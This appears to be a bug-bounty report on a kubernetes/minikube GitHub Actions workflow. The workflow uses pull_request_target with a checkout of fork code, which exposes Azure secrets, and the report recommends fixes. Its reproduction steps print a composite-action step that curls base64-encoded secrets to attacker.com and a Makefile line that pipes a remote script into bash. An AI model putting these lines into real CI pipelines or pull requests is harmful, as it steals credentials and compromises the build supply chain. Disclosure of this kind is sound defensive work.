# HackerOne Report: kubernetes/minikube — `pull_request_target` with untrusted code checkout exposes Azure credentials

## Summary

The `functional_extra.yml` GitHub Actions workflow in `kubernetes/minikube` uses the `pull_request_target` trigger combined with `actions/checkout` of the PR author's HEAD commit. This checks out untrusted fork code into a privileged workflow context that has access to 5 Azure secrets. The workflow then **builds and executes** the checked-out code on Azure VMs, allowing a malicious PR author to achieve remote code execution with Azure infrastructure credentials.

Additionally, the workflow uses `uses: ./.github/actions/install-gopogh` and `uses: ./.github/actions/generate-report`, which load composite GitHub Actions **from the checked-out fork code**, giving the attacker direct control over workflow step execution.

## Severity

**Critical** (Tier 2 — minikube is a non-core GA component)

- **Confidentiality Impact:** Azure service principal credentials (client ID, secret, subscription, tenant) can be exfiltrated
- **Integrity Impact:** Attacker can create/modify/delete Azure resources in the `SIG-CLUSTER-LIFECYCLE-MINIKUBE` resource group
- **Availability Impact:** Attacker can destroy Azure infrastructure used for minikube CI

## Vulnerable Asset

- **Repository:** https://github.com/kubernetes/minikube
- **File:** `.github/workflows/functional_extra.yml`
- **Trigger:** `pull_request_target` with type `labeled`

## Vulnerability Details

### The Dangerous Pattern

The workflow at `.github/workflows/functional_extra.yml` combines three elements that together create a critical vulnerability:

**1. `pull_request_target` trigger (line 6):**
```yaml
on:
  pull_request_target:
    types: [labeled]
```
`pull_request_target` runs in the context of the **base repository** (kubernetes/minikube), with access to repository secrets. Unlike `pull_request`, which runs in a sandboxed fork context without secrets.

**2. Checkout of untrusted PR code (line 20-22):**
```yaml
- uses: actions/checkout@v6
  with:
    ref: ${{ github.event.pull_request.head.sha || github.ref }}
```
This checks out the PR author's commit (`head.sha`), which is untrusted fork code. The code now exists in the privileged `pull_request_target` context with access to all secrets.

**3. Build and execution of untrusted code (lines 31-35, 47-56):**
```yaml
- name: Build Windows Binaries
  run: |
    make e2e-windows-amd64.exe
    make minikube-windows-amd64.exe

- name: Copy Binaries to VM
  run: |
    sshpass -e scp ... ./out/minikube-windows-amd64.exe "$USER@$HOST:..."
    sshpass -e scp ... ./out/e2e-windows-amd64.exe "$USER@$HOST:..."
```
The Makefile from the fork is executed (`make`), and the resulting binaries are copied to and executed on an Azure VM.

### Composite Actions from Fork Code

The workflow also uses local composite actions:
```yaml
- uses: ./.github/actions/install-gopogh    # Line ~37
- uses: ./.github/actions/generate-report   # Line ~65
```

Since `actions/checkout` already checked out the fork's code, these `uses: ./.github/actions/...` references resolve to the **attacker's fork code**. The attacker can modify `.github/actions/install-gopogh/action.yml` to include arbitrary `run:` steps that execute in the privileged context.

### Secrets Exposed

The workflow has access to these secrets:
1. `secrets.MINIKUBE_AZ_CLIENT_ID` — Azure service principal client ID
2. `secrets.MINIKUBE_AZ_PASSWORD` — Azure service principal secret
3. `secrets.MINIKUBE_AZ_SUBSCRIPTION_ID` — Azure subscription ID
4. `secrets.MINIKUBE_AZ_TENANT_ID` — Azure tenant ID
5. `secrets.MINIKUBE_AZ_CI_WINDOWS_VM_PASSWORD` — Windows VM admin password

### Label Guard Analysis

The workflow has a guard:
```yaml
if: |
  github.repository == 'kubernetes/minikube' && (
    (github.event_name == 'pull_request_target' &&
     contains(github.event.pull_request.labels.*.name, 'ok-to-extra-test')) || ...
  )
```

This requires a maintainer to add the `ok-to-extra-test` label. However, this guard is insufficient because:

1. **TOCTOU (Time-of-Check/Time-of-Use):** The maintainer reviews the PR code, then adds the label. Between review and labeling, the PR author can push a new commit with malicious code. `github.event.pull_request.head.sha` reflects the HEAD at the time of the `labeled` event, which includes the new malicious commit.

2. **No SHA pinning:** The label is not bound to a specific commit SHA. The workflow checks out whatever `head.sha` is current when the label is added, not the SHA that was reviewed.

3. **Composite action override:** Even if the main code looks innocent, the attacker can hide malicious logic in `.github/actions/install-gopogh/action.yml` or `.github/actions/generate-report/action.yml`, which are less likely to be reviewed.

## Steps to Reproduce

1. Fork `kubernetes/minikube`
2. Create a branch with innocent-looking changes (e.g., a documentation fix)
3. Open a PR to `kubernetes/minikube`
4. Wait for a maintainer to begin reviewing
5. Push a new commit that modifies `.github/actions/install-gopogh/action.yml`:
   ```yaml
   runs:
     using: "composite"
     steps:
       - run: |
           echo "${{ secrets.MINIKUBE_AZ_CLIENT_ID }}" | base64 | curl -d @- https://attacker.com/exfil
           echo "${{ secrets.MINIKUBE_AZ_PASSWORD }}" | base64 | curl -d @- https://attacker.com/exfil
         shell: bash
   ```
   Or modify the `Makefile` to include:
   ```makefile
   e2e-windows-amd64.exe:
       curl -s https://attacker.com/payload.sh | bash
       # ... original build commands
   ```
6. If the maintainer adds the `ok-to-extra-test` label after step 5, the workflow executes the malicious code with access to all Azure secrets.

**Note:** I did NOT actually perform this attack. This is a theoretical PoC based on source code analysis.

## Impact

- **Credential theft:** All 5 Azure secrets can be exfiltrated, granting the attacker access to the minikube CI Azure subscription
- **Infrastructure compromise:** The attacker can create, modify, or delete Azure resources in the `SIG-CLUSTER-LIFECYCLE-MINIKUBE` resource group
- **Lateral movement:** Azure credentials may provide access to other resources in the same subscription/tenant
- **Supply chain risk:** The attacker could potentially modify minikube build artifacts during the CI process

## Recommended Fix

**Option 1 (Best): Split into two workflows**
```yaml
# Workflow 1: pull_request (sandboxed, no secrets)
on: pull_request
# Build and upload artifacts

# Workflow 2: workflow_run (privileged, has secrets)
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
# Download artifacts and deploy to Azure
```

**Option 2: Pin to reviewed SHA**
Store the reviewed SHA when the label is added and verify it matches at checkout time. However, this is complex and error-prone.

**Option 3: Remove local action references**
Replace `uses: ./.github/actions/...` with pinned external actions or inline `run:` steps that don't depend on checked-out code.

## References

- GitHub Security Lab: ["Keeping your GitHub Actions and workflows secure"](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- GitHub Docs: ["Security hardening for GitHub Actions"](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#pull_request_target)
- Vulnerable file: `https://github.com/kubernetes/minikube/blob/master/.github/workflows/functional_extra.yml`
